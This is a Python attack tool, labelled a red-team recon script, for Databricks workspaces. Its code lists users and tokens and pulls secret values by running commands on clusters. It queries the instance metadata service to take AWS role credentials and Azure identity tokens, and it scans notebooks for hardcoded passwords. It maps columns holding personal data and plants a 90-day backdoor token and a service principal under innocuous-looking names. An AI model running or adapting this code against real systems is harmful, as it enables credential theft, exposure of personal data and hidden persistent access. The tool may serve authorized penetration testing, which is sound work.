"""
Databricks Red Team Recon
Covers: admin check, secrets enum, PII column discovery,
        IMDS lateral movement (AWS/Azure), MSSQL cred extraction,
        and persistence.

Usage:
    pip install databricks-sdk pymssql

    export DATABRICKS_HOST=https://<workspace>.azuredatabricks.net
    export DATABRICKS_TOKEN=dapi...

    python db_recon.py --host https://<workspace>.azuredatabricks.net --token dapi... [--enum] [--secrets] [--cloud aws|azure] [--persist]
"""

import re
import json
import time
import argparse
import os
from databricks.sdk import WorkspaceClient
from databricks.sdk.service.compute import Language, ClusterSpec, AutoScale
from databricks.sdk.service.sql import StatementState
from databricks.sdk.service.workspace import ExportFormat

# ── config ────────────────────────────────────────────────────────────────────

PII_RE = re.compile(
    r"\b(ssn|social.?sec|passport|dob|birth_?date|email|phone|mobile|"
    r"credit.?card|card.?num|account.?num|routing|iban|swift|"
    r"address|zip.?code|postal|first.?name|last.?name|full.?name|"
    r"driver.?lic|national.?id|tax.?id|ein|salary|income|"
    r"medical|diagnosis|patient|hipaa|gender|race|ethnicity)\b",
    re.IGNORECASE,
)

MSSQL_SECRET_RE = re.compile(
    r"(mssql|sqlserver|sql.?server|jdbc.?sqlserver|"
    r"password|passwd|pwd|conn.?str|connectionstring)",
    re.IGNORECASE,
)

IMDS_AWS = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
IMDS_AZURE = (
    "http://169.254.169.254/metadata/identity/oauth2/token"
    "?api-version=2018-02-01&resource=https://management.azure.com/"
)


# ── helpers ───────────────────────────────────────────────────────────────────

def banner(msg):
    print(f"\n{'='*60}\n  {msg}\n{'='*60}")

def ok(msg):   print(f"  [+] {msg}")
def info(msg): print(f"  [*] {msg}")
def warn(msg): print(f"  [!] {msg}")


def run_cluster_command(w: WorkspaceClient, cluster_id: str, code: str, lang=Language.PYTHON) -> str:
    """Execute code on a running cluster and return stdout."""
    ctx = w.command_execution.create(cluster_id=cluster_id, language=lang)
    while ctx.status.value not in ("Running", "Error"):
        time.sleep(1)
        ctx = w.command_execution.context_status(cluster_id=cluster_id, context_id=ctx.id)

    cmd = w.command_execution.execute(
        cluster_id=cluster_id,
        context_id=ctx.id,
        language=lang,
        command=code,
    )
    while cmd.status.value not in ("Finished", "Error", "Cancelled"):
        time.sleep(2)
        cmd = w.command_execution.command_status(
            cluster_id=cluster_id, context_id=ctx.id, command_id=cmd.id
        )

    w.command_execution.destroy(cluster_id=cluster_id, context_id=ctx.id)

    if cmd.results and cmd.results.result_type.value == "text":
        return cmd.results.data or ""
    return str(cmd.results) if cmd.results else ""


def find_running_cluster(w: WorkspaceClient) -> str | None:
    """Return first running cluster id, preferring smaller/shared ones to avoid noise."""
    for c in w.clusters.list():
        if c.state and c.state.value == "RUNNING":
            info(f"Using existing cluster: {c.cluster_name} ({c.cluster_id})")
            return c.cluster_id
    return None


# ── recon modules ─────────────────────────────────────────────────────────────

def recon_identity(w: WorkspaceClient):
    banner("IDENTITY & PERMISSIONS")
    me = w.current_user.me()
    ok(f"Authenticated as: {me.user_name}  (id={me.id})")

    is_admin = any(g.display == "admins" for g in (me.groups or []))
    if is_admin:
        ok("ADMIN — full workspace access confirmed")
    else:
        warn("Not in admins group — some paths may be blocked")

    return is_admin


def recon_tokens(w: WorkspaceClient):
    banner("EXISTING PAT TOKENS")
    try:
        for t in w.token_management.list():
            ok(f"Token: {t.comment or '<no comment>'}  created={t.creation_time}  expires={t.expiry_time}  owner={t.created_by_username}")
    except Exception as e:
        warn(f"Token list failed (needs admin): {e}")


def secrets_list(w: WorkspaceClient):
    """List all secret scopes and every key name. No values, no cluster."""
    banner("SECRETS — list")
    try:
        scopes = list(w.secrets.list_scopes())
        ok(f"Found {len(scopes)} scope(s)")
        for scope in scopes:
            info(f"Scope: {scope.name}")
            try:
                for s in w.secrets.list(scope=scope.name):
                    flag = "  ** SQL/JDBC **" if MSSQL_SECRET_RE.search(s.key) else ""
                    print(f"      {scope.name}/{s.key}{flag}")
            except Exception as e:
                warn(f"  Cannot list keys in {scope.name}: {e}")
    except Exception as e:
        warn(f"Secrets list failed: {e}")


def secrets_get(w: WorkspaceClient, cluster_id: str, targets: list[dict]):
    """Extract values for specific scope/key pairs via cluster execution."""
    banner("SECRETS — get values")
    for t in targets:
        code = f"print(dbutils.secrets.get(scope='{t['scope']}', key='{t['key']}'))"
        info(f"Reading {t['scope']}/{t['key']} ...")
        val = run_cluster_command(w, cluster_id, code).strip()
        if val and "[REDACTED]" not in val:
            ok(f"  {t['scope']}/{t['key']} = {val}")
        else:
            warn(f"  {t['scope']}/{t['key']} — redacted or empty")


def recon_pii_columns(w: WorkspaceClient):
    """
    Walk Unity Catalog / Hive metastore and flag tables with PII-named columns.
    No data is read — schema only.
    """
    banner("PII COLUMN DISCOVERY (schema only, no data pulled)")
    findings = []

    try:
        catalogs = list(w.catalogs.list())
    except Exception:
        catalogs = []
        warn("Unity Catalog not available — falling back to Hive metastore")

    if catalogs:
        for cat in catalogs:
            try:
                for schema in w.schemas.list(catalog_name=cat.name):
                    try:
                        for tbl in w.tables.list(catalog_name=cat.name, schema_name=schema.name):
                            if not tbl.columns:
                                continue
                            pii_cols = [c.name for c in tbl.columns if PII_RE.search(c.name)]
                            if pii_cols:
                                path = f"{cat.name}.{schema.name}.{tbl.name}"
                                ok(f"PII columns in {path}: {pii_cols}")
                                findings.append({"table": path, "columns": pii_cols})
                    except Exception:
                        pass
            except Exception:
                pass
    else:
        # Hive path via SQL warehouse
        try:
            wh = next(iter(w.warehouses.list()), None)
            if wh:
                for db_row in _sql_query(w, wh.id, "SHOW DATABASES"):
                    db = db_row[0]
                    for tbl_row in _sql_query(w, wh.id, f"SHOW TABLES IN `{db}`"):
                        tbl = tbl_row[1]
                        for col_row in _sql_query(w, wh.id, f"DESCRIBE `{db}`.`{tbl}`"):
                            col_name = col_row[0]
                            if PII_RE.search(col_name):
                                path = f"{db}.{tbl}"
                                ok(f"PII column in {path}: {col_name}")
                                findings.append({"table": path, "columns": [col_name]})
        except Exception as e:
            warn(f"Hive metastore walk failed: {e}")

    if not findings:
        info("No PII-named columns found")
    return findings


def dump_schema(w: WorkspaceClient):
    banner("SCHEMA DUMP")
    try:
        catalogs = list(w.catalogs.list())
    except Exception:
        catalogs = []
        warn("Unity Catalog not available — falling back to Hive metastore")

    if catalogs:
        for cat in catalogs:
            print(f"\n  [*] {cat.name}")
            try:
                for schema in w.schemas.list(catalog_name=cat.name):
                    print(f"      [*] {schema.name}")
                    try:
                        for tbl in w.tables.list(catalog_name=cat.name, schema_name=schema.name):
                            cols = ", ".join(c.name for c in (tbl.columns or []))
                            print(f"          {tbl.name:<30} : {cols}")
                    except Exception:
                        pass
            except Exception:
                pass
    else:
        try:
            wh = next(iter(w.warehouses.list()), None)
            if not wh:
                warn("No SQL warehouse available for Hive metastore dump")
                return
            for db_row in _sql_query(w, wh.id, "SHOW DATABASES"):
                db = db_row[0]
                print(f"\n  [*] {db}")
                for tbl_row in _sql_query(w, wh.id, f"SHOW TABLES IN `{db}`"):
                    tbl = tbl_row[1]
                    cols = [r[0] for r in _sql_query(w, wh.id, f"DESCRIBE `{db}`.`{tbl}`") if r[0] and not r[0].startswith("#")]
                    print(f"      {tbl:<30} : {', '.join(cols)}")
        except Exception as e:
            warn(f"Schema dump failed: {e}")


def _sql_query(w: WorkspaceClient, warehouse_id: str, statement: str) -> list:
    """Fire a SQL statement against a warehouse, return rows."""
    resp = w.statement_execution.execute_statement(
        warehouse_id=warehouse_id,
        statement=statement,
        wait_timeout="30s",
    )
    if resp.status.state != StatementState.SUCCEEDED:
        return []
    if not resp.result or not resp.result.data_array:
        return []
    return resp.result.data_array


def recon_imds(w: WorkspaceClient, cluster_id: str, cloud: str):
    banner(f"IMDS LATERAL MOVEMENT ({cloud.upper()})")

    if cloud == "aws":
        # Step 1: list roles attached to the instance profile
        code = f"""
import urllib.request
r = urllib.request.urlopen("{IMDS_AWS}", timeout=3).read().decode()
print("ROLES:", r)
"""
        roles_out = run_cluster_command(w, cluster_id, code)
        print(roles_out)

        roles = [l.strip() for l in roles_out.splitlines() if l.strip() and "ROLES:" not in l]
        for role in roles:
            code2 = f"""
import urllib.request, json
creds = json.loads(urllib.request.urlopen("{IMDS_AWS}{role}", timeout=3).read())
for k,v in creds.items(): print(f"{{k}}: {{v}}")
"""
            ok(f"Fetching creds for role: {role}")
            print(run_cluster_command(w, cluster_id, code2))

    elif cloud == "azure":
        code = f"""
import urllib.request, json
req = urllib.request.Request("{IMDS_AZURE}", headers={{"Metadata": "true"}})
token = json.loads(urllib.request.urlopen(req, timeout=3).read())
print(json.dumps(token, indent=2))
"""
        ok("Fetching Azure managed identity token from IMDS...")
        print(run_cluster_command(w, cluster_id, code))



def persist(w: WorkspaceClient):
    banner("PERSISTENCE")

    # 1. Create a long-lived PAT token
    try:
        tok = w.tokens.create(
            comment="databricks-monitoring-svc",  # ponytail: benign-looking comment
            lifetime_seconds=60 * 60 * 24 * 90,  # 90 days
        )
        ok(f"Backdoor PAT created: {tok.token_value}")
        ok(f"  Store this: export DATABRICKS_TOKEN={tok.token_value}")
    except Exception as e:
        warn(f"PAT creation failed: {e}")

    # 2. Create a service principal (requires admin + account-level perms)
    try:
        sp = w.service_principals.create(
            display_name="databricks-telemetry-agent",
            active=True,
        )
        ok(f"Service principal created: id={sp.id}  name={sp.display_name}")
    except Exception as e:
        warn(f"SP creation failed (may need account admin): {e}")


# ── enum helpers ──────────────────────────────────────────────────────────────

def recon_users(w: WorkspaceClient):
    banner("USERS")
    try:
        for u in w.users.list():
            groups = ", ".join(g.display for g in (u.groups or []))
            ok(f"{u.user_name}  groups=[{groups}]")
    except Exception as e:
        warn(f"User list failed: {e}")


def recon_clusters(w: WorkspaceClient):
    banner("CLUSTERS")
    try:
        for c in w.clusters.list():
            ok(f"{c.cluster_name}  state={c.state.value if c.state else '?'}  "
               f"id={c.cluster_id}  creator={c.creator_user_name}  "
               f"spark={c.spark_version}")
    except Exception as e:
        warn(f"Cluster list failed: {e}")


NOTEBOOK_CRED_RE = re.compile(
    r"(password|passwd|pwd|secret|token|api.?key|access.?key|conn.?str|"
    r"connectionstring|jdbc:|spark\.hadoop\.|fs\.azure\.|fs\.s3)",
    re.IGNORECASE,
)


def _walk_workspace(w: WorkspaceClient, path: str) -> list:
    notebooks = []
    try:
        for obj in w.workspace.list(path=path):
            if obj.object_type and obj.object_type.value == "NOTEBOOK":
                notebooks.append(obj)
            elif obj.object_type and obj.object_type.value == "DIRECTORY":
                notebooks.extend(_walk_workspace(w, obj.path))
    except Exception:
        pass
    return notebooks


def _filter_by_days(notebooks: list, days: int | None) -> list:
    if not days:
        return notebooks
    import time as _time
    cutoff_ms = (_time.time() - days * 86400) * 1000
    return [nb for nb in notebooks if nb.modified_at and nb.modified_at >= cutoff_ms]


def notebooks_list(w: WorkspaceClient, days: int | None):
    banner(f"NOTEBOOKS — list {'(all time)' if not days else f'(last {days} days)'}")
    all_nbs = _walk_workspace(w, "/")
    nbs = _filter_by_days(all_nbs, days)
    info(f"{len(nbs)} notebook(s) matched (total in workspace: {len(all_nbs)})")
    for nb in sorted(nbs, key=lambda n: n.modified_at or 0, reverse=True):
        import datetime
        ts = datetime.datetime.fromtimestamp((nb.modified_at or 0) / 1000).strftime("%Y-%m-%d") if nb.modified_at else "?"
        print(f"  {ts}  {nb.path}")
    return nbs


def notebooks_pull(w: WorkspaceClient, target: str, days: int | None, save_dir: str | None = None):
    """Scan notebook source for hardcoded creds. target='*' or a specific path."""
    import base64
    banner(f"NOTEBOOKS — pull {'*' if target == '*' else target}"
           + (f"  (last {days} days)" if days else ""))

    if target == "*":
        all_nbs = _walk_workspace(w, "/")
        nbs = _filter_by_days(all_nbs, days)
    else:
        # single notebook — days filter ignored, path is explicit
        nbs = _walk_workspace(w, target) or []
        if not nbs:
            # target might be the notebook path directly
            try:
                obj = w.workspace.get_status(path=target)
                nbs = [obj]
            except Exception as e:
                warn(f"Could not find notebook at {target}: {e}")
                return []

    if save_dir:
        os.makedirs(save_dir, exist_ok=True)
        info(f"Saving notebooks to {save_dir}/")

    info(f"Scanning {len(nbs)} notebook(s) for credential patterns...")
    hits = []
    for nb in nbs:
        try:
            export = w.workspace.export(path=nb.path, format=ExportFormat.SOURCE)
            if not export.content:
                continue
            source = base64.b64decode(export.content).decode("utf-8", errors="replace")

            if save_dir:
                # mirror the workspace path under save_dir, swap / for _ to flatten
                safe_name = nb.path.lstrip("/").replace("/", "__") + ".py"
                out_path = os.path.join(save_dir, safe_name)
                with open(out_path, "w", encoding="utf-8") as f:
                    f.write(source)
                info(f"Saved {nb.path} → {out_path}")

            matched_lines = [
                (i + 1, line.strip())
                for i, line in enumerate(source.splitlines())
                if NOTEBOOK_CRED_RE.search(line)
            ]
            if matched_lines:
                ok(f"{nb.path}  (modified={nb.modified_at})")
                for lineno, line in matched_lines[:10]:
                    print(f"      L{lineno}: {line[:120]}")
                hits.append({"path": nb.path, "matches": len(matched_lines)})
        except Exception:
            pass

    if not hits:
        info("No credential patterns found")
    return hits


# ── DBFS shell ────────────────────────────────────────────────────────────────

def dbfs_shell(w: WorkspaceClient):
    """Interactive DBFS explorer. No cluster required — pure REST API."""
    import base64 as _b64
    import posixpath

    cwd = "/"
    print("\nDBFS Shell  (no cluster required)")
    print("Commands: ls [path]  cd <path>  cat <path>  get <path> [local]  find <name>  pwd  exit\n")

    def _abs(path: str) -> str:
        if path.startswith("/"):
            return path.rstrip("/") or "/"
        return posixpath.normpath(posixpath.join(cwd, path))

    def _ls(path: str):
        try:
            items = list(w.dbfs.list(path=path))
            if not items:
                print("  (empty)")
                return
            for f in sorted(items, key=lambda x: (not x.is_dir, x.path)):
                size = f"  {f.file_size:>12,}B" if not f.is_dir else "           <DIR>"
                name = posixpath.basename(f.path) + ("/" if f.is_dir else "")
                print(f"  {size}  {name}")
        except Exception as e:
            print(f"  error: {e}")

    def _cat(path: str, max_bytes: int = 8192):
        try:
            status = w.dbfs.get_status(path=path)
            if status.is_dir:
                print("  error: is a directory")
                return
            total = status.file_size or 0
            read_len = min(max_bytes, total)
            result = w.dbfs.read(path=path, offset=0, length=read_len)
            data = _b64.b64decode(result.data or "")
            try:
                print(data.decode("utf-8"))
            except UnicodeDecodeError:
                print(f"  <binary file — {total:,} bytes>")
            if total > max_bytes:
                print(f"\n  ... truncated ({total:,} total bytes, showed {max_bytes:,})")
        except Exception as e:
            print(f"  error: {e}")

    def _get(remote: str, local: str):
        try:
            status = w.dbfs.get_status(path=remote)
            total = status.file_size or 0
            chunk = 1024 * 1024  # 1MB per read — DBFS API limit
            with open(local, "wb") as f:
                offset = 0
                while offset < total:
                    result = w.dbfs.read(path=remote, offset=offset, length=min(chunk, total - offset))
                    f.write(_b64.b64decode(result.data or ""))
                    offset += chunk
            print(f"  saved {total:,} bytes → {local}")
        except Exception as e:
            print(f"  error: {e}")

    def _find(root: str, pattern: str):
        import fnmatch
        try:
            for item in w.dbfs.list(path=root):
                name = posixpath.basename(item.path)
                if fnmatch.fnmatch(name.lower(), pattern.lower()):
                    tag = "<DIR>" if item.is_dir else f"{item.file_size:,}B"
                    print(f"  {tag:<14}  {item.path}")
                if item.is_dir:
                    _find(item.path, pattern)
        except Exception:
            pass

    while True:
        try:
            line = input(f"dbfs:{cwd}> ").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            break
        if not line:
            continue

        parts = line.split(None, 2)
        cmd = parts[0].lower()

        if cmd in ("exit", "quit"):
            break
        elif cmd == "pwd":
            print(f"  {cwd}")
        elif cmd == "ls":
            path = _abs(parts[1]) if len(parts) > 1 else cwd
            _ls(path)
        elif cmd == "cd":
            if len(parts) < 2:
                cwd = "/"
            else:
                target = _abs(parts[1])
                try:
                    status = w.dbfs.get_status(path=target)
                    if status.is_dir:
                        cwd = target
                    else:
                        print(f"  not a directory: {target}")
                except Exception as e:
                    print(f"  error: {e}")
        elif cmd == "cat":
            if len(parts) < 2:
                print("  usage: cat <path>")
            else:
                _cat(_abs(parts[1]))
        elif cmd == "get":
            if len(parts) < 2:
                print("  usage: get <remote_path> [local_path]")
            else:
                remote = _abs(parts[1])
                local = parts[2] if len(parts) > 2 else posixpath.basename(remote)
                _get(remote, local)
        elif cmd == "find":
            if len(parts) < 2:
                print("  usage: find <pattern>  (e.g. find *.csv)")
            else:
                _find(cwd, parts[1])
        else:
            print(f"  unknown command: {cmd}")


# ── main ──────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(
        description="Databricks red team recon — run only the modules you need",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Flags (combinable):
  --enum                Identity, tokens, users, clusters, PII schema  [API only]
  --secrets-list        List all secret scopes and key names  [API only]
  --secrets-get S/K,.. Extract values for specific scope/key pairs  [cluster]
                        Format: scope/key,scope/key  (copy from --secrets-list output)
  --cloud               IMDS lateral movement via cluster  [cluster]
  --persist             Create backdoor PAT token + service principal  [writes]
  --notebooks-list      List all notebooks (path + last modified)  [API only]
  --notebooks-pull *|PATH  Scan notebook(s) for hardcoded creds  [API only]
  --days N              Filter notebooks modified in last N days (use with either notebooks flag)
  --dbfs-shell          Interactive DBFS file browser (ls, cd, cat, get, find)  [API only]

Examples:
  python db_recon.py --enum
  python db_recon.py --notebooks-list
  python db_recon.py --notebooks-list --days 30
  python db_recon.py --notebooks-pull "*"
  python db_recon.py --notebooks-pull "*" --days 90
  python db_recon.py --notebooks-pull "/Users/jsmith/etl-pipeline"
  python db_recon.py --enum --secrets --cloud aws --persist
        """,
    )
    parser.add_argument("--host",            metavar="URL",        help="Workspace URL (overrides DATABRICKS_HOST)")
    parser.add_argument("--token",           metavar="DAPI...",    help="PAT token (overrides DATABRICKS_TOKEN)")
    parser.add_argument("--enum",            action="store_true", help="Identity, tokens, users, clusters, PII schema")
    parser.add_argument("--secrets-list",    action="store_true",  help="List all secret scopes and key names")
    parser.add_argument("--secrets-get",     metavar="SCOPE/KEY,..", help="Extract values for comma-separated scope/key pairs")
    parser.add_argument("--cloud",           choices=["aws", "azure"], default=None, help="IMDS lateral movement via cluster")
    parser.add_argument("--persist",         action="store_true", help="Create backdoor PAT token + service principal")
    parser.add_argument("--dump-schema",     action="store_true", help="Dump all catalogs/schemas/tables/columns")
    parser.add_argument("--notebooks-list",  action="store_true", help="List notebooks (path + modified date)")
    parser.add_argument("--notebooks-pull",  metavar="PATH|*",    help="Scan notebook(s) for creds; * for all")
    parser.add_argument("--save-dir",        metavar="DIR",        help="Save pulled notebook source to this directory")
    parser.add_argument("--days",            type=int, default=None, metavar="N", help="Only notebooks modified in last N days")
    parser.add_argument("--dbfs-shell",      action="store_true", help="Interactive DBFS file browser")
    args = parser.parse_args()

    if not any([args.enum, args.secrets_list, args.secrets_get, args.cloud, args.persist,
                args.dump_schema, args.notebooks_list, args.notebooks_pull, args.dbfs_shell]):
        parser.print_help()
        return

    w = WorkspaceClient(
        host=args.host or os.environ.get("DATABRICKS_HOST"),
        token=args.token or os.environ.get("DATABRICKS_TOKEN"),
    )

    # cluster is only resolved when a module needs it
    _cluster_id = None
    def get_cluster():
        nonlocal _cluster_id
        if _cluster_id is None:
            _cluster_id = find_running_cluster(w)
            if not _cluster_id:
                warn("No running cluster found — skipping cluster-dependent steps")
        return _cluster_id

    summary = {}

    if args.enum:
        recon_identity(w)
        recon_tokens(w)
        recon_users(w)
        recon_clusters(w)
        pii_findings = recon_pii_columns(w)
        summary["pii_tables"] = len(pii_findings)

    if args.dump_schema:
        dump_schema(w)

    if args.notebooks_list:
        notebooks_list(w, args.days)

    if args.notebooks_pull:
        nb_hits = notebooks_pull(w, args.notebooks_pull, args.days, args.save_dir)
        summary["notebooks_with_creds"] = len(nb_hits)

    if args.secrets_list:
        secrets_list(w)

    if args.secrets_get:
        targets = []
        for entry in args.secrets_get.split(","):
            entry = entry.strip()
            if "/" not in entry:
                warn(f"Skipping malformed entry (expected scope/key): {entry}")
                continue
            scope, key = entry.split("/", 1)
            targets.append({"scope": scope.strip(), "key": key.strip()})
        if targets:
            cid = get_cluster()
            if cid:
                secrets_get(w, cid, targets)
                summary["secrets_extracted"] = len(targets)

    if args.cloud:
        cid = get_cluster()
        if cid:
            recon_imds(w, cid, args.cloud)

    if args.persist:
        persist(w)

    if args.dbfs_shell:
        dbfs_shell(w)

    if summary:
        banner("SUMMARY")
        print(json.dumps(summary, indent=2))


if __name__ == "__main__":
    main()
